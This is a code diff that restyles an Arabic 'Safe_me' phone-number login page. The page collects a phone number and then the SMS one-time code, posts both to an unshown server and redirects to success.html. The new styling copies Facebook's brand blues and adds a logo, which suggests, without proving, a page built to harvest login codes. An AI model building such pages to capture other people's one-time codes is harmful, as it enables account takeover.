@@ -4,10 +4,11 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>Safe_me</title>
+  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
   <style>
     body {
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      background: #f0f2f5;
+      font-family: 'Cairo', sans-serif;
+      background: linear-gradient(135deg, #4267B2, #29487d);
       display: flex;
       justify-content: center;
       align-items: center;
@@ -18,26 +19,34 @@
 
     .container {
       background: white;
-      border-radius: 12px;
-      box-shadow: 0 8px 24px rgba(0,0,0,0.1);
-      padding: 30px 40px;
+      border-radius: 16px;
+      box-shadow: 0 12px 30px rgba(0, 0, 0, 0.15);
+      padding: 30px 35px;
       width: 100%;
       max-width: 420px;
       box-sizing: border-box;
+      text-align: center;
+    }
+
+    .container img.logo {
+      width: 80px;
+      height: 80px;
+      margin-bottom: 15px;
     }
 
     h2 {
-      text-align: center;
       margin-bottom: 25px;
       color: #333;
       font-weight: 700;
+      font-size: 22px;
     }
 
     label {
       display: block;
       margin-bottom: 8px;
       font-weight: 600;
-      color: #555;
+      color: #444;
+      text-align: right;
     }
 
     input[type="tel"],
@@ -45,27 +54,30 @@
       width: 100%;
       padding: 12px 15px;
       font-size: 16px;
-      border-radius: 8px;
+      border-radius: 10px;
       border: 1.8px solid #ccc;
-      margin-bottom: 20px;
+      margin-bottom: 18px;
       transition: border-color 0.3s ease;
-      font-family: inherit;
       box-sizing: border-box;
+      font-family: inherit;
     }
 
-    input[type="tel"]:focus,
-    input[type="text"]:focus {
-      border-color: #28a745;
+    input:focus {
+      border-color: #1877f2;
       outline: none;
+    }
+
+    input:disabled {
+      background-color: #f2f2f2;
     }
 
     button {
       width: 100%;
-      padding: 14px;
-      font-size: 18px;
-      background-color: #28a745;
+      padding: 13px;
+      font-size: 17px;
+      background-color: #1877f2;
       border: none;
-      border-radius: 8px;
+      border-radius: 10px;
       color: white;
       cursor: pointer;
       font-weight: 700;
@@ -74,11 +86,11 @@
     }
 
     button:hover:not(:disabled) {
-      background-color: #218838;
+      background-color: #145dbf;
     }
 
     button:disabled {
-      background-color: #94d3a2;
+      background-color: #a7c3f2;
       cursor: not-allowed;
     }
 
@@ -94,17 +106,18 @@
       display: none;
     }
 
-    .success-message {
-      color: #28a745;
-      font-weight: bold;
-      text-align: center;
-      margin-bottom: 10px;
+    .error {
+      color: red;
+      font-size: 14px;
+      margin-top: -10px;
+      margin-bottom: 15px;
     }
   </style>
 </head>
 <body>
 
   <div class="container">
+    <img src="logo.jpg" alt="الشعار" class="logo" />
     <h2>التسجيل برقم الهاتف</h2>
 
     <form id="phoneForm" onsubmit="return sendPhone(event);">
@@ -116,8 +129,9 @@
 
     <form id="codeForm" onsubmit="return sendCode(event);">
       <div id="codeField">
-        <label for="code">جاري ارسال الكود SMS</label>
+        <label for="code">جاري إرسال الكود عبر SMS</label>
         <input type="text" id="code" name="code" placeholder="اكتب الكود هنا" autocomplete="one-time-code" />
+        <div id="errorMessage" class="error"></div>
         <button type="submit" id="sendCodeBtn">طلب الدخول</button>
       </div>
     </form>
@@ -130,6 +144,7 @@
     const codeField = document.getElementById('codeField');
     const phoneInput = document.getElementById('phone');
     const codeInput = document.getElementById('code');
+    const errorMessage = document.getElementById('errorMessage');
 
     function startTimer(duration) {
       let timeLeft = duration;
@@ -171,19 +186,16 @@
         body: JSON.stringify({ phone: phoneInput.value })
       })
       .then(response => {
-        if (!response.ok) {
-          throw new Error('فشل إرسال رقم الهاتف');
-        }
+        if (!response.ok) throw new Error('فشل إرسال رقم الهاتف');
 
-        codeField.style.display = 'block';
-        sendPhoneBtn.disabled = true;
         phoneInput.disabled = true;
-        timerDisplay.textContent = "✅ تم إرسال الكود بنجاح، تحقق من الرسائل.";
+        sendPhoneBtn.disabled = true;
+        codeField.style.display = 'block';
         startTimer(480); // 8 دقائق
       })
       .catch(error => {
-        console.error('فشل الإرسال:', error);
         alert('تعذر إرسال رقم الهاتف. حاول مرة أخرى.');
+        console.error(error);
       });
 
       return false;
@@ -191,9 +203,10 @@
 
     function sendCode(event) {
       event.preventDefault();
+      errorMessage.textContent = '';
 
       if (codeInput.value.trim() === '') {
-        alert('يرجى كتابة الكود المرسل إليك.');
+        errorMessage.textContent = 'يرجى كتابة الكود المرسل إليك.';
         codeInput.focus();
         return false;
       }
@@ -211,16 +224,18 @@
         },
         body: JSON.stringify(payload)
       })
-      .then(response => {
-        if (response.ok) {
+      .then(async response => {
+        const data = await response.json();
+
+        if (response.ok && data.success !== false) {
           window.location.href = 'success.html';
         } else {
-          alert('حدث خطأ أثناء طلب الدخول. حاول مرة أخرى.');
+          errorMessage.textContent = '❌ هناك خطأ في الكود المرسل. حاول مرة أخرى.';
         }
       })
       .catch(error => {
-        console.error('فشل الإرسال:', error);
-        alert('فشل الاتصال بالسيرفر.');
+        errorMessage.textContent = '⚠️ تعذر الاتصال بالخادم.';
+        console.error(error);
       });
 
       return false;
